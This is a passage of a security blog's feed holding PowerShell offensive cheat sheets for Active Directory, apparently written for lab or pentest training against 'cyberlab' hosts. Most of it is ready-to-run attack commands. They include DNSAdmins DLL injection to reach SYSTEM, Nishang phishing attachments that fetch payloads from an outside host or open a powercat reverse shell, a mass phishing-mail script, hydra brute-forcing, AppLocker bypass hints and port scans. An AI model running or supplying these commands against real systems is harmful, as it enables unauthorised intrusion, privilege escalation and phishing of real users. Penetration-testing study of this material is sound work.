&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">Reflection.Assembly&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">LoadWithPartialName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;System.IdentityModel&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">out-null&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$idToImpersonate&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Security&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Principal&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">WindowsIdentity&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$idToImpersonate&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Impersonate&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="no">System.Security.Principal.WindowsIdentity&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetCurrent&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Try to access the service (in case the COMPUTER1 is allowed to delegate to DC CIFS service):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="dnsadmin">DNSAdmin&lt;/h2>
&lt;p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of &lt;em>dns.exe&lt;/em> (SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Privileges to restart the DNS service are needed.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Enumerate the members of the DNSAdmis group&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;DNSAdmins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;DNSAdmins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we know the members of the DNSAdmins group, we need to compromise a member.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Install DNS RSAT tools (if not present):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WindowsCapability&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RSAT&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">-Online&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Add-WindowsCapability&lt;/span> &lt;span class="err">â&lt;/span>&lt;span class="n">Online&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RSAT DNS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dnscmd&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">config&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">serverlevelplugindll&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">FILESERVER_IP&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">dll&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">mimilib&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">dll&lt;/span> &lt;span class="c"># Absolute path&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or using DNSServer module (needs RSAT DNS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RSAT DNS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dnsettings&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-DnsServerSetting&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-All&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dnsettings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ServerLevelPluginDll&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;\\FILESERVER_IP\dll\mimilib.dll&amp;#34;&lt;/span> &lt;span class="c"># Absolute path&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DnsServerSetting&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="nv">$dnsettings&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>From a CMD shell restart the DNS service (assuming that the DNSAdmins group has the permission to do so):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="n">dns&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="nb">start &lt;/span>&lt;span class="n">dns&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By default, the mimilib.dll logs all DNS queries to &lt;strong>C:\Windows\System32\kiwidns.log&lt;/strong>&lt;/p>
&lt;p>If you want to implement a custom DLL to perform custom actions (i.e.Â add a user to the Administrators group), it is possible to use the template present at this link &lt;a href="https://github.com/kazkansouh/DNSAdmin-DLL" target="_blank" rel="noopener">DNSAdmin-DLL&lt;/a>. In fact, the DLL must export predefined functions to be accepted by the DNS service.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="phishing">Phishing&lt;/h2>
&lt;p>In order to perform a phishing attack it is necessary to perform the following steps:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Find the mail server by looking at SMTP open ports (25, 587, 465):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="mf">25&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">587&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">465&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="n">smtp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-d&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Generate a malicious attachment to be sent within the mail message:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-PayloadScript&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-PowerShellTcp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;-c net localgroup administrators CYBERLAB\STUDENT01 /add&amp;#34;&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-Excel&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-DDE&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c . \\10.10.10.10\tmp\powercat.ps1; powercat -c ws01 -p 443 -e cmd&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c net localgroup administrators cyberlab\student01 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Connect to the SMTP server and the send the message to the recipients:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># phishing.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$recipients&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;lbunce@cyberlab.local&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;bschonfelder@cyberlab.local&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sender&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;giovanni@pecoraro.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$subject&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Important mail&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$body&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Please open the attachment&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$smtp_server&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;smtp.cyberlab.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$smtp_port&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">25&lt;/span>&lt;span class="nv">$attachment_path&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;.\doc.chm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">Foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$rcpt&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nv">$recipients&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="n">-ForegroundColor&lt;/span> &lt;span class="n">Yellow&lt;/span> &lt;span class="s2">&amp;#34;Sending phishing email to &lt;/span>&lt;span class="nv">$rcpt&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Send-MailMessage&lt;/span> &lt;span class="n">-To&lt;/span> &lt;span class="nv">$rcpt&lt;/span> &lt;span class="n">-From&lt;/span> &lt;span class="nv">$sender&lt;/span> &lt;span class="n">-Subject&lt;/span> &lt;span class="nv">$subject&lt;/span> &lt;span class="n">-Body&lt;/span> &lt;span class="nv">$body&lt;/span> &lt;span class="n">-SmtpServer&lt;/span> &lt;span class="nv">$smtp_server&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="nv">$smtp_port&lt;/span> &lt;span class="n">-Attachments&lt;/span> &lt;span class="nv">$attachment_path&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="brute-forcing">Brute-forcing&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># hydra.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">hydra&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-L&lt;/span> &lt;span class="p">..\&lt;/span>&lt;span class="n">usernames&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">-P&lt;/span> &lt;span class="p">..\&lt;/span>&lt;span class="mf">500&lt;/span>&lt;span class="n">-worst-passwords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="s2">&amp;#34;http-post-form://192.168.2.50:8080/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2FasynchPeople%2F&amp;amp;Submit=Sign+in:Invalid&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Lateral Movement cheatsheet</title><link>https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/</link><pubDate>Sun, 24 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/</guid><description>&lt;h2 id="local-files">Local Files&lt;/h2>
&lt;p>Find local senstive files on computers:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ChildItem&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*.&lt;/span>&lt;span class="n">xml&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-RecurseGet-ChildItem&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">unattend&lt;/span>&lt;span class="p">*.&lt;/span>&lt;span class="n">xml&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="applocker">AppLocker&lt;/h2>
&lt;p>Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at &lt;a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS&lt;/a> if only signed binaries are allowed:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-AppLockerPolicy&lt;/span> &lt;span class="n">-Effective&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">RuleCollections&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port-scanning">Port Scanning&lt;/h2>
&lt;p>Check machine reachability:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Test-NetConnection&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">3389&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Perform a port scanning:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerSploit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Open and filtered ports&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- FILTERED ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">filteredPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- FILTERED ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">filteredPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Only open ports&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
